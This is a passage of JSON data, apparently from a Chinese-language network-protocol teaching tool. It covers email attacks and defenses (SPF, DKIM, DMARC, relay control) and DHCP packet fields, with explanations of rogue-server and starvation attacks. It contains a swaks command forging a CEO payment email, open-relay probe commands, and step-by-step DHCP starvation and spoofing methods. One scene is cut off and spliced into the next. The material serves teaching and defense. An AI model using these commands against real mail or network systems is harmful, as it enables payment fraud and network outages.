Received，首部与正文用空行分开。","sub":"只有别人替你写的那几行值得信。"},{"who":"收件人","to":"邮件服务器","pkt":2,"bubble":"POP3 取信","hl":["USER","PASS","RETR 1"],"vals":{"USER":"bob","PASS":"s3cr3t","RETR 1":"第 1 封"},"say":"POP3 用明文 USER/PASS 登录，RETR 取走整封信。","sub":"同网段嗅探就能拿到账号口令。"}]}]},{"key":"attack","no":"第 2 幕","title":"它会被怎么打","desc":"伪造发件人骗过收件人；借你的服务器骗过整个世界","lead":"两个场景都不需要破解任何东西：一个伪造的是字符串，一个滥用的是配置。","scenes":[{"name":"伪造发件人（SPF/DKIM 失效）","cmds":{"linux":[{"c":"swaks --to finance@corp.example --from ceo@corp.example --server mx.corp.example --header 'Subject: 紧急付款' --body '请立即转账'","n":" 放中继滥用","cmds":{"linux":[{"c":"swaks --to victim@other.example --from ceo@corp.example --server mail.corp.example","n":"一条命令测开放中继：被接受即中继开着","s":"补充（vault 无 swaks，中继探测最快）"},{"c":"swaks --to x@other.example --server mail.corp.example --quit-after RCPT","n":"只用 RCPT 试探不真发信，成本最低","s":"补充（vault 无 swaks，探测而不发信）"},{"c":"sudo tcpdump -ni any -A 'tcp port 25' | grep -E 'MAIL FROM|RCPT TO'","n":"抓一次中继会话，看清“非本地到非本地”","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"Test-NetConnection mail.corp.example -Port 25","n":"中继入口是否可达","s":"《系统》PowerShell.md · Test-NetConnection"},{"c":"Resolve-DnsName corp.example -Type MX","n":"确认这就是该域的出口 MTA","s":"补充（vault 未收录 Resolve-DnsName）"}],"cmd":[{"c":"nslookup -type=mx corp.example","n":"MX 指向哪台机器，就是可疑中继","s":"《系统》Windows CMD.md · nslookup"},{"c":"telnet mail.corp.example 25","n":"手敲 MAIL FROM/RCPT TO，看是否回 250","s":"补充（vault 未收录 telnet，且 Win 默认未安装）"}]},"steps":[{"who":"攻击者","to":"企业 MTA","pkt":0,"evil":true,"bubble":"EHLO 探能力","hl":["EHLO","250-"],"vals":{"EHLO":"attacker.example","250-":"250-mail.corp.example"},"say":"先探能力：支不支持 AUTH、单封上限多少。","sub":"能力列表就是后续手法的目录。"},{"who":"企业 MTA","to":"攻击者","pkt":0,"bubble":"如实相告","hl":["250-SIZE","250-8BITMIME"],"vals":{"250-SIZE":"10240000","250-8BITMIME":"允许 8 位字节"},"say":"服务器老实报出 SIZE 与扩展；没要求 AUTH 就是中继开着的信号。","sub":"未认证就收 MAIL FROM，等于公共邮局。"},{"who":"攻击者","to":"企业 MTA","pkt":0,"evil":true,"bubble":"非本地到非本地","hl":["MAIL FROM","RCPT TO"],"vals":{"MAIL FROM":"<ceo@corp.example>","RCPT TO":"<victim@other.example>（×5000）"},"say":"发件人写成本域、收件人全是外部域，一次塞五千个 RCPT。","sub":"这就是中继滥用的标准形态。"},{"who":"企业 MTA","to":"外部 MX","pkt":0,"bubble":"逐封中转","hl":["RCPT TO","250 2.1.5"],"vals":{"RCPT TO":"<victim@other.example>","250 2.1.5":"250 2.1.5 Ok ×5000"},"say":"五千封信全从企业出口 IP 发出，反垃圾组织立刻拉黑这个 IP。","sub":"真正被罚的是正常业务邮件。"},{"who":"受害者（收件人）","to":"—","pkt":1,"bubble":"SPF 反而背书","hl":["Received","From","Return-Path"],"vals":{"Received":"from mail.corp.example [203.0.113.25]","From":"\"CEO Zhang\" <ceo@corp.example>"},"say":"信确实从 corp.example 的授权 IP 发出，SPF 校验通过。","sub":"验证机制替攻击者做了担保。"}]}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"用 DNS 里的策略在投递阶段就判死，用 TLS 在路上封口","lead":"两条攻击重放：伪造在 SPF/DKIM/DMARC 对齐处被拒收，中继在“非本地到非本地”处被关死。","scenes":[{"name":"SPF + DKIM + DMARC 拒收","cmds":{"linux":[{"c":"dig +short TXT corp.example","n":"应看到 v=spf1 … -all，结尾 -all 才是否决式","s":"补充（vault 无 dig，查 SPF）"},{"c":"dig +short TXT _dmarc.corp.example","n":"DMARC 策略，p=reject 才真拦","s":"补充（vault 无 dig，查 DMARC）"},{"c":"dig +short TXT default._domainkey.corp.example","n":"DKIM 公钥是否存在，没有就没法验签","s":"补充（vault 无 dig，查 DKIM 公钥）"}],"ps":[{"c":"Resolve-DnsName _dmarc.corp.example -Type TXT","n":"Windows 侧读 DMARC 策略","s":"补充（vault 未收录 Resolve-DnsName）"},{"c":"Test-NetConnection mail.corp.example -Port 25","n":"验证 MTA-STS 与证书策略生效后端口行为","s":"《系统》PowerShell.md · Test-NetConnection"}],"cmd":[{"c":"nslookup -type=txt _dmarc.corp.example","n":"看 p= 后面是 none 还是 reject","s":"《系统》Windows CMD.md · nslookup"},{"c":"nslookup -type=txt corp.example","n":"SPF 记录内容与结尾限定符","s":"《系统》Windows CMD.md · nslookup"}]},"steps":[{"who":"目标 MX","to":"伪造信","pkt":0,"bubble":"SPF fail","hl":["MAIL FROM","250 2.1.0"],"vals":{"MAIL FROM":"<ceo@corp.example>","250 2.1.0":"信封域查 SPF → 45.33.12.9 不在列表 → fail"},"say":"接收方用信封域查 SPF，连接 IP 不在授权列表，判 fail。","sub":"SPF 只看 IP，不看内容。"},{"who":"目标 MX","to":"伪造信","pkt":1,"bubble":"对齐失败","hl":["From","Return-Path","Message-ID"],"vals":{"From":"\"CEO Zhang\" <ceo@corp.example>","Return-Path":"<ceo@corp.example>","Message-ID":"域与 From 不一致 → 判为伪造"},"say":"无 DKIM 签名，对齐失败；DMARC 要求 SPF 或 DKIM 至少一项通过且对齐。","sub":"两样都不成立，按 p=reject 处置。"},{"who":"目标 MX","to":"攻击者","pkt":0,"bubble":"550 拒收","hl":["MAIL FROM","250 2.1.0"],"vals":{"MAIL FROM":"<ceo@corp.example>","250 2.1.0":"550 5.7.1 DMARC policy reject"},"say":"信在 DATA 之后被整封拒收，不投递、也不进垃圾箱。","sub":"发件域先发布 p=reject，这条才生效。"},{"who":"企业 MTA","to":"攻击者","pkt":0,"bubble":"中继关闭","hl":["MAIL FROM","RCPT TO"],"vals":{"MAIL FROM":"<ceo@corp.example>（非认证）","RCPT TO":"<victim@other.example> → 550 relay denied"},"say":"只放行已认证用户，或本地域与外部域之间的两类投递。","sub":"非本地到非本地一律 550。"},{"who":"收件人","to":"邮件服务器","pkt":3,"bubble":"993 加密取信","hl":["* OK","a1 LOGIN","a1 OK"],"vals":{"* OK":"[CAPABILITY IMAP4rev1 STARTTLS]","a1 LOGIN":"在 TLS 通道内提交","a1 OK":"LOGIN completed"},"say":"取信走 993 隐式 TLS 或 STARTTLS 升级，口令不再明文。","sub":"STARTTLS 前几步仍明文，须强制加密。"}]}]}]}},{"proto":{"id":"dhcp","name":"DHCP","cn":"动态主机配置协议","en":"Dynamic Host Configuration Protocol","layer":"application","chapter":"第五章","extra":false,"oneLine":"开机时用四个广播报文换来 IP、掩码、网关、DNS 四项配置——全程没有一次认证，谁能先答谁就赢。","sections":[{"h":"四参数与即插即用：DHCP 替人写配置文件","p":"一台主机接入网络必须配好四样东西：IP 地址、子网掩码、默认网关、DNS 服务器。前两者决定“我是谁、谁是本地”，后两者决定“出网走哪、名字问谁”。手工配置在主机多、变动频繁的网络里几乎必然出错——地址冲突、网关写错、DNS 漏配，每种都能造成“网线插着但上不了网”。\n\nDHCP 把这份配置交给协议去协商，实现“即插即联网”。它跑在 UDP 之上：服务器监听 67、客户端监听 68，报文沿用早期 BOOTP 的格式。分配方式有三种——自动（永久绑定）、手动（管理员为特定 MAC 固定地址）、动态（有租期的临时地址）。安全问题的根源在第一句就写好了：客户端在拿到配置之前，没有任何办法验证“给我配置的那台机器是谁”。"},{"h":"DORA 四报文：广播是为了在“无地址”状态下能开口","p":"动态分配分四步：DISCOVER（客户端广播“谁是 DHCP 服务器”）→ OFFER（服务器回应“这个地址给你”）→ REQUEST（客户端广播“我要用这个”）→ ACK（服务器确认）。之所以前两步必须广播，是因为客户端此时源 IP 只能是 0.0.0.0，既不知道自己是谁，也不知道服务器在哪，只能朝所有人喊。\n\nREQUEST 也广播，是一个很优雅的资源回收设计：所有发过 OFFER 的服务器都听到了“我没被选中”，于是收回各自的提议，不会把地址长期挂在“待确认”状态。反过来看，这条广播也把所有服务器的地址池信息暴露在同一网段里——包括攻击者的耳朵。"},{"h":"236 字节固定头 + TLV 选项：chaddr 就是身份","p":"报文固定部分 236 字节：op（1）、htype（1）、hlen（1）、hops（1）、xid（4）、secs（2）、flags（2）、ciaddr/yiaddr/siaddr/giaddr（各 4）、chaddr（16）、sname（64）、file（128），随后是 4 字节魔数 0x63825363 与变长选项区。选项是 TLV：1 字节码、1 字节长度、若干值。\n\n其中 chaddr 是服务器的“身份依据”——它按 MAC 记忆“这台机器该用哪个地址”。而 RFC 2131 又引入了选项 61（client identifier）来承担真正的身份，理由是 chaddr 同时被用于“发应答时的目的链路地址”和“客户端标识”，语义重叠。这个重叠正是饥饿攻击的着力点：只改 chaddr 就能骗到新地址。"},{"h":"租约与 T1/T2：地址是有时限的借据","p":"地址不是永久给出去的，而是一份租约（lease）。假设租期 T，客户端在 T1=0.5T 时向原服务器单播请求续租；若没有回应，在 T2=0.875T 时改为广播，允许任何服务器接手；到 T 必须停止使用该地址。客户端也可随时发 RELEASE 提前归还。\n\n计时器的意义在于“配置不会永久错误”：即便某次分配出了问题，最迟一个租期后就会被纠正。反过来，攻击者最爱改的选项之一就是租期——把 3600 秒改成 4294967295 秒，等于让错误配置在设备重启前永不失效。所以“异常长的租期”在流量侧是一条很硬的检测规则。"},{"h":"中继代理与 giaddr：跨网段的地址从哪来","p":"不可能每个网段都放一台 DHCP 服务器，因此每个网络至少有一个中继代理（relay agent），它知道服务器在哪。中继收到客户端的广播 DISCOVER 后，改成单播发给服务器，并把 giaddr 填成自己面向客户端那侧的接口地址；服务器据此判断“这个请求来自哪个子网”，从而从对应的地址池里挑地址。\n\n这里有一条隐含的信任：服务器完全相信 giaddr。谁能伪造 giaddr，谁就能让服务器从别的子网发地址，造成跨网段的地址错配。因此中继报文的入口必须限定在可信网段，这也是 DHCP Snooping 在端口层面区分“信任/非信任”的现实理由。"},{"h":"无认证的 UDP：三处可冒充","p":"DHCP 报文只是 UDP 的用户数据，既没有完整性保护，也没有任何认证字段。任何能构造 UDP 包的主机都能伪造：冒充客户端可以吃空地址池（饥饿），冒充服务器可以下发错误的网关与 DNS（仿冒），冒充中继可以扰乱地址池选择（giaddr 伪造）。\n\n这三种攻击的共同点是“抢答”——客户端只看 xid 与 op 就接受应答，先到先得。因此防御不能靠协议本身，只能在接入层做：交换机记住“哪个端口上发生过哪次合法分配”，然后拒绝一切与该记录不符的声明。这就是 DHCP Snooping 的思路——把配置阶段的事实固化成运行阶段的规则。"}],"packets":[{"title":"DHCP DISCOVER 报文（236 字节固定头 + 4 字节魔数 + TLV 选项，共 270 字节）","note":"开机后客户端还没有地址，源 IP 只能是 0.0.0.0，目的只能是广播；注意 chaddr 用的是真实网卡 MAC","hex":"01 01 06 00 3d 1e 2f 4a 00 00 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 11 22 33 44 55 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 63 82 53 63 35 01 01 3d 07 01 00 11 22 33 44 55 0c 09 76 69 63 74 69 6d 2d 70 63 37 04 01 03 06 0f ff","fields":[{"name":"op","cn":"报文类型","off":0,"len":1,"bits":"1=BOOTREQUEST / 2=BOOTREPLY","tone":"type","desc":"1 字节。1=BOOTREQUEST（客户端发出），2=BOOTREPLY（服务器发出）。DHCP 沿用 BOOTP 的报文格式，这个字段就是最早的“方向标志”。","sec":"攻击者构造报文的第一步就是决定把这里写 1 还是 2：写 2 才像服务器应答，能被客户端当作 OFFER 接受。"},{"name":"htype","cn":"硬件类型","off":1,"len":1,"bits":"","tone":"type","desc":"1 字节，取值同 ARP 的硬件类型，1 表示 10Mb 以太网。","sec":"非 1 的取值（如 6=IEEE 802 网络）会让某些实现走进不同的解析分支，是畸形包探测点。"},{"name":"hlen","cn":"硬件地址长度","off":2,"len":1,"bits":"","tone":"type","desc":"1 字节，以太网 MAC 为 6。它告诉解析器 chaddr 里前多少字节有效。","sec":"hlen 与 htype 不匹配（如 htype=1 而 hlen=16）是构造畸形包的常用手法，部分老旧实现会因此越界读取。"},{"name":"hops","cn":"中继跳数","off":3,"len":1,"bits":"","tone":"count","desc":"1 字节。客户端置 0，每经一个中继代理加 1；超过 16 通常被丢弃。","sec":"这是判断“报文是否跨网段、是否被异常转发”的唯一字段。攻击者在其他网段伪造报文时，hops 与实际拓扑对不上。"},{"name":"xid","cn":"事务标识","off":4,"len":4,"bits":"","tone":"id","desc":"4 字节随机数，客户端生成，服务器在 OFFER/ACK 中原样返回，双方靠它配对请求与应答。","sec":"xid 是客户端判断“这个 OFFER 是不是给我的”的主要依据之一。它可被预测或从旁路读到，因此伪造 OFFER 的命中率极高。"},{"name":"secs","cn":"已耗时","off":8,"len":2,"bits":"","tone":"count","desc":"2 字节，客户端自开始申请地址起经过的秒数。服务器可据此优先服务等待久的客户端。","sec":"本字段在常见攻击中不作为独立手段，但恒为 0 的大量请求是脚本化发包的特征。"},{"name":"flags","cn":"标志","off":10,"len":2,"bits":"bit0 广播标志 B / bit1-15 保留（须为 0）","tone":"flag","desc":"2 字节，最高位是广播标志 B：置 1 表示“请用广播回我”（客户端还不能接收单播）。其余位保留必须为 0。","sec":"攻击者置 B=1 可让服务器的应答走广播，从而被同网段所有人（包括嗅探者）看到，便于收集地址池与服务器信息。"},{"name":"ciaddr","cn":"客户端当前地址","off":12,"len":4,"bits":"","tone":"addr","desc":"4 字节。仅在 BOUND/RENEW/REBIND 状态下填写（客户端已有可用地址时），首次申请时为 0。","sec":"续租时这里带着“我正在用的地址”，攻击者可据此定向伪造 NAK，把受害者从租约里踢出去。"},{"name":"yiaddr","cn":"分配给客户端的地址","off":16,"len":4,"bits":"","tone":"addr","desc":"4 字节，“your IP”。服务器在 OFFER/ACK 中填入它选定的地址；DISCOVER 中为 0。","sec":"仿冒服务器正是靠填这个字段把客户端引入错误网络：填一个不可路由的地址，或填与自己同网段的地址以便做中间人。"},{"name":"siaddr","cn":"下一台服务器地址","off":20,"len":4,"bits":"","tone":"addr","desc":"4 字节，引导过程下一步要用的服务器地址（如 TFTP）。服务器通常在 OFFER/ACK 中填自己的地址。","sec":"若网络使用 PXE 引导，这个字段指向的服务器就是“下一个被信任的代码来源”——被改写即等于远程植入。"},{"name":"giaddr","cn":"中继代理地址","off":24,"len":4,"bits":"","tone":"addr","desc":"4 字节。中继代理转发时填入自己的地址，服务器据此判断客户端所在子网并从对应地址池分配。","sec":"服务器完全依赖这个字段选地址池。伪造 giaddr 可让服务器从别的子网池里发地址，造成跨网段错配；这也是“中继报文必须来自可信网段”的原因。"},{"name":"chaddr","cn":"客户端硬件地址","off":28,"len":16,"bits":"","tone":"hwaddr","desc":"16 字节，前 hlen（6）字节有效，其余补 0。服务器按这个 MAC 分配与记忆地址。","sec":"饥饿攻击伪造的就是这 16 字节里的前 6 字节：换一个 MAC 就换一个“新客户端”，地址池被迅速吃空。Snooping 校验的也正是它与帧源 MAC 是否一致。"},{"name":"sname","cn":"服务器名","off":44,"len":64,"bits":"","tone":"name","desc":"64 字节，可选的服务器主机名，以 0 结尾的字符串。本例全 0（未使用）。","sec":"该字段可携带任意字符串，部分老客户端会显示或记录它；是低成本的信息泄露/仿冒点（写上合法服务器名以增强可信度）。"},{"name":"file","cn":"引导文件名","off":108,"len":128,"bits":"","tone":"name","desc":"128 字节，引导文件名。DISCOVER 中为空或通用名，OFFER 中为完整路径名。本例全 0。","sec":"PXE 场景下这里指定要下载的镜像路径；被篡改即把客户端引向攻击者的镜像。"},{"name":"magic","cn":"魔数（Cookie）","off":236,"len":4,"bits":"","tone":"magic","desc":"4 字节固定值 0x63825363。它把 BOOTP 与 DHCP 区分开：有此魔数，其后的字节才按 DHCP 选项（TLV）解析。","sec":"这是解析器的分支开关。构造一个只带 BOOTP 字段、不带魔数的报文，可能让某些实现跳过选项校验，从而绕过基于选项的准入策略。"},{"name":"opt53","cn":"选项 53：报文类型","off":240,"len":3,"bits":"","tone":"opt","desc":"TLV 结构：0x35(53) + 长度 1 + 值。值为 1 表示 DHCPDISCOVER。8 种类型：1 DISCOVER、2 OFFER、3 REQUEST、4 DECLINE、5 ACK、6 NAK、7 RELEASE、8 INFORM。","sec":"服务器靠这个字段决定行为。伪造一个 opt53=5（ACK）的报文即可让客户端相信地址已确认，即使根本没有服务器同意过。"},{"name":"opt61","cn":"选项 61：客户端标识","off":243,"len":9,"bits":"","tone":"opt","desc":"长度 7：类型 1（以太网）+ 6 字节 MAC。它是“客户端身份”的正式表达，服务器用它而非 chaddr 做地址绑定（RFC 2131 明确用 client identifier 消除 chaddr 的双重语义）。","sec":"这也解释了一个细节：只改 chaddr 而不改 opt61 时，某些服务器仍会认为是同一个客户端。于是饥饿攻击必须两个字段一起伪造，而 Snooping 只需比对 chaddr 与帧源 MAC。"},{"name":"opt12","cn":"选项 12：主机名","off":252,"len":11,"bits":"","tone":"opt","desc":"长度 9 的字符串，客户端自报主机名，服务器可据此更新 DNS 动态记录。","sec":"主机名可任意填写且不被校验，是“动态 DNS 抢注”的入口：攻击者用他人主机名注册，让内部域名指向自己的 IP。"},{"name":"opt55","cn":"选项 55：参数请求列表","off":263,"len":6,"bits":"","tone":"opt","desc":"长度 4，按优先级列出想要的选项码：1 子网掩码、3 路由器、6 DNS 服务器、15 域名。","sec":"客户端显式索要“网关”和“DNS”，意味着这两个选项一定会被使用——所以仿冒服务器只要在这两项上撒谎，就能接管全部流量与解析。"},{"name":"end","cn":"选项结束","off":269,"len":1,"bits":"","tone":"pad","desc":"0xFF 单字节，标记选项区结束；其后为填充（0x00）直到报文最小长度。","sec":"缺失结束符会让解析器继续读越界内存，是被动指纹识别与崩溃类攻击的常见触发点。"}]},{"title":"DHCP OFFER 报文（274 字节）：yiaddr 与租约选项","note":"服务器单播回复，op=2，yiaddr 填入拟分配的 192.168.0.100；这里展示仿冒服务器会改写哪些字节","hex":"02 01 06 00 3d 1e 2f 4a 00 00 80 00 00 00 00 00 c0 a8 00 64 c0 a8 00 01 00 00 00 00 00 11 22 33 44 55 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 63 82 53 63 35 01 02 36 04 c0 a8 00 01 33 04 00 00 0e 10 01 04 ff ff ff 00 03 04 c0 a8 00 fe 06 04 c0 a8 00 fd ff","fields":[{"name":"op","cn":"报文类型","off":0,"len":1,"bits":"","tone":"type","desc":"2=BOOTREPLY，表示这是服务器发出的应答。","sec":"客户端只看 op 与 xid 就决定是否接受——这两个字段都是攻击者可以随手写对的，因此“应答”这件事本身毫无认证。"},{"name":"htype","cn":"硬件类型","off":1,"len":1,"bits":"","tone":"type","desc":"1 = 以太网。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"hlen","cn":"硬件地址长度","off":2,"len":1,"bits":"","tone":"type","desc":"6 字节 MAC。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"hops","cn":"中继跳数","off":3,"len":1,"bits":"","tone":"count","desc":"本例报文未经中继，hops=0。","sec":"若声称来自其他网段却 hops=0，说明是直接构造的伪造报文。"},{"name":"xid","cn":"事务标识","off":4,"len":4,"bits":"","tone":"id","desc":"与 DISCOVER 完全一致，客户端据此确认“这是回应我的请求”。","sec":"攻击者只要嗅到 DISCOVER 就能复制 xid；在共享介质（无线、HUB、镜像口）上这一步几乎零成本。"},{"name":"secs","cn":"已耗时","off":8,"len":2,"bits":"","tone":"count","desc":"服务器通常回填 0。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"flags","cn":"标志","off":10,"len":2,"bits":"bit0 广播标志 B / bit1-15 保留","tone":"flag","desc":"广播标志仍为 1，应答以广播发出。","sec":"广播应答让同网段任何人（包括攻击者）都能看到服务器分配了哪个地址、租期多久——这是地址池侦察的信息来源。"},{"name":"ciaddr","cn":"客户端当前地址","off":12,"len":4,"bits":"","tone":"addr","desc":"首次分配，客户端尚无地址，为 0。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"yiaddr","cn":"分配给客户端的地址","off":16,"len":4,"bits":"","tone":"addr","desc":"0xC0A80064 = 192.168.0.100，这就是客户端将配置到网卡上的地址。","sec":"仿冒服务器最直接的破坏手法：填一个已被占用的地址制造冲突，或填一个不可路由的地址让客户端“配上了却上不了网”。"},{"name":"siaddr","cn":"下一台服务器地址","off":20,"len":4,"bits":"","tone":"addr","desc":"192.168.0.1，本例即 DHCP 服务器自身。","sec":"PXE 场景下这里被改写，客户端会去下载攻击者的引导镜像——这是 BIOS/UEFI 层面的代码注入路径。"},{"name":"giaddr","cn":"中继代理地址","off":24,"len":4,"bits":"","tone":"addr","desc":"未经过中继，为 0。","sec":"服务器从 giaddr 判定子网。伪造非 0 的 giaddr，可让服务器从错误的地址池取地址。"},{"name":"chaddr","cn":"客户端硬件地址","off":28,"len":16,"bits":"","tone":"hwaddr","desc":"与 DISCOVER 中的 MAC 一致，服务器靠它做地址绑定。","sec":"服务器把“这个 MAC 已分配过地址”记在绑定表里；伪造不同 chaddr 就能不断索取新地址，这是饥饿攻击的原理。"},{"name":"sname","cn":"服务器名","off":44,"len":64,"bits":"","tone":"name","desc":"本例未填写（全 0）。","sec":"填上合法服务器的名字，可让抓包工具与部分客户端显示“来自可信服务器”，增强仿冒可信度。"},{"name":"file","cn":"引导文件名","off":108,"len":128,"bits":"","tone":"name","desc":"本例未填写（全 0）。","sec":"PXE 路径注入点，同 siaddr。"},{"name":"magic","cn":"魔数（Cookie）","off":236,"len":4,"bits":"","tone":"magic","desc":"固定 0x63825363，标志其后为 DHCP 选项。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"options","cn":"选项区（TLV）","off":240,"len":34,"bits":"","tone":"opt","desc":"共 34 字节：53 类型=2(OFFER)、54 服务器标识=192.168.0.1、51 租期=3600 秒、1 子网掩码=255.255.255.0、3 路由器=192.168.0.254、6 DNS=192.168.0.253、255 结束。","sec":"选项 3 与 6 是整套配置里最危险的两个：改掉它们，客户端之后的所有出网流量与域名解析都经过攻击者，一次 DHCP 应答即完成全面中间人。"}]},{"title":"DHCP 选项区（TLV）：从魔数开始的 38 字节","note":"偏移量相对这段选项块的第 0 字节；在完整报文中它起于第 236 字节","hex":"63 82 53 63 35 01 02 36 04 c0 a8 00 01 33 04 00 00 0e 10 01 04 ff ff ff 00 03 04 c0 a8 00 fe 06 04 c0 a8 00 fd ff","fields":[{"name":"magic","cn":"魔数","off":0,"len":4,"bits":"","tone":"magic","desc":"0x63825363，选项块的起点。","sec":"若这里不是这个值，整块会被当作 BOOTP 的 vend 区（厂商自定义），从而跳过 DHCP 语义校验。"},{"name":"opt53-code","cn":"选项码 53","off":4,"len":1,"bits":"","tone":"opt","desc":"十进制 53，表示 DHCP Message Type。它是每个 DHCP 报文的第一个必选选项。","sec":"解析器通常先读这个选项来决定“这是请求还是应答”，因此它也是伪造报文最容易出错、最容易被检测的地方。"},{"name":"opt53-len","cn":"长度 = 1","off":5,"len":1,"bits":"","tone":"len","desc":"值长度为 1 字节。","sec":"TLV 的长度字段是解析器的锚点：长度写错会让后续所有选项错位，这也是最常见的畸形包构造手法。"},{"name":"opt53-val","cn":"值 = 2（OFFER）","off":6,"len":1,"bits":"","tone":"data","desc":"2 = DHCPOFFER；1 DISCOVER、3 REQUEST、5 ACK、6 NAK。","sec":"把这里从 5 改成 6，同一条报文就从“确认”变成“否认”——客户端收到 NAK 会立刻放弃当前地址重新申请，一次改字节即完成拒绝服务。"},{"name":"opt54-code","cn":"选项码 54","off":7,"len":1,"bits":"","tone":"opt","desc":"Server Identifier（服务器标识）。","sec":"客户端用它区分多个 OFFER 并作为后续单播的目的地址；伪造它可把客户端的续租请求引向攻击者。"},{"name":"opt54-len","cn":"长度 = 4","off":8,"len":1,"bits":"","tone":"len","desc":"一个 IPv4 地址的长度。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"opt54-val","cn":"服务器标识 = 192.168.0.1","off":9,"len":4,"bits":"","tone":"addr","desc":"合法服务器的地址。客户端此后把 REQUEST 单播到这个地址。","sec":"仿冒服务器把自己的地址写在这里，客户端后续续租就直接找攻击者，形成“一次应答、长期跟随”的效果。"},{"name":"opt51-code","cn":"选项码 51","off":13,"len":1,"bits":"","tone":"opt","desc":"IP Address Lease Time（租期）。","sec":"租期长短直接决定攻击窗口：伪造超长租期可让错误配置长期生效。"},{"name":"opt51-len","cn":"长度 = 4","off":14,"len":1,"bits":"","tone":"len","desc":"32 位秒数。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"opt51-val","cn":"租期 = 3600 秒","off":15,"len":4,"bits":"","tone":"timer","desc":"0x0E10 = 3600 秒。客户端据此算出 T1=1800 秒、T2=3150 秒两个续租计时器。","sec":"伪造一个 4294967295 秒的租期，等于让错误配置在设备重启前永不纠正；这也是检测规则里“异常租期”的由来。"},{"name":"opt01-code","cn":"选项码 1","off":19,"len":1,"bits":"","tone":"opt","desc":"Subnet Mask（子网掩码）。","sec":"它决定“谁是本地”——掩码被改大，本地网段被人为扩大，可造成大量流量走网关或直接旁路。"},{"name":"opt01-len","cn":"长度 = 4","off":20,"len":1,"bits":"","tone":"len","desc":"IPv4 掩码长度。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"opt01-val","cn":"掩码 = 255.255.255.0","off":21,"len":4,"bits":"","tone":"addr","desc":"/24 掩码，192.168.0.0/24 为本地网段。","sec":"掩码被改成 /16，客户端会把 192.168.0.0~192.168.255.255 全当本地，ARP 请求大量外溢，也可能直连到不该连的网段。"},{"name":"opt03-code","cn":"选项码 3","off":25,"len":1,"bits":"","tone":"opt","desc":"Router（默认网关），可含多个地址。","sec":"这是整套配置里最值钱的选项：改它即接管全部出网流量。"},{"name":"opt03-len","cn":"长度 = 4","off":26,"len":1,"bits":"","tone":"len","desc":"单个网关地址长度。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"opt03-val","cn":"网关 = 192.168.0.254","off":27,"len":4,"bits":"","tone":"addr","desc":"客户端所有非本地流量都发往这个地址。","sec":"仿冒服务器把这里改成自己的 IP，客户端此后所有出网流量经过攻击者——从“配错地址”升级为“全面中间人”，且用户毫无感知。"},{"name":"opt06-code","cn":"选项码 6","off":31,"len":1,"bits":"","tone":"opt","desc":"Domain Name Server（DNS 服务器），可含多个地址。","sec":"改 DNS 比改网关更隐蔽：只影响解析，不影响连通性。"},{"name":"opt06-len","cn":"长度 = 4","off":32,"len":1,"bits":"","tone":"len","desc":"单个 DNS 地址长度。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"opt06-val","cn":"DNS = 192.168.0.253","off":33,"len":4,"bits":"","tone":"addr","desc":"客户端的首选解析器。","sec":"把这里指向攻击者的解析器，可在不改任何流量的情况下把特定域名解析到钓鱼站点——这也是 DHCP 与 DNS 两类攻击的接合点。"},{"name":"end","cn":"选项结束 0xFF","off":37,"len":1,"bits":"","tone":"pad","desc":"标记选项区到此为止，其后是 0x00 填充至报文最小长度。","sec":"填充区常被当作“无用字节”忽略，但它可以被写入数据（选项填充隐蔽信道），某些检测只解析到 0xFF 为止。"}]}],"attacks":[{"name":"DHCP Starvation","cn":"DHCP 饥饿攻击","impact":"地址池被伪造的租约吃空，合法客户端拿不到 IP，整片网段“插着网线却上不了网”","steps":[{"who":"攻击者","to":"广播域","label":"DHCP DISCOVER，chaddr=00:11:22:33:44:55，xid=0x3d1e2f4a，opt53=1","note":"从正常的第一次申请开始，服务器为这个 MAC 预留地址"},{"who":"DHCP 服务器","to":"攻击者","label":"DHCP OFFER，yiaddr=192.168.0.100，opt51=3600，opt54=192.168.0.1","note":"服务器把 .100 标记为“已提议”，进入待确认状态"},{"who":"攻击者","to":"DHCP 服务器","label":"DHCP REQUEST，opt50 请求 .100，opt54 指定该服务器","note":"完成绑定，.100 正式从池中划出，租期 3600 秒"},{"who":"攻击者","to":"DHCP 服务器","label":"循环：chaddr 换成 00:11:22:33:44:56/57/58…，重复 DISCOVER→REQUEST，每秒数百次","note":"每个新 MAC 都换来一个新地址；/24 的 253 个可用地址在数十秒内耗尽"},{"who":"合法客户端","to":"DHCP 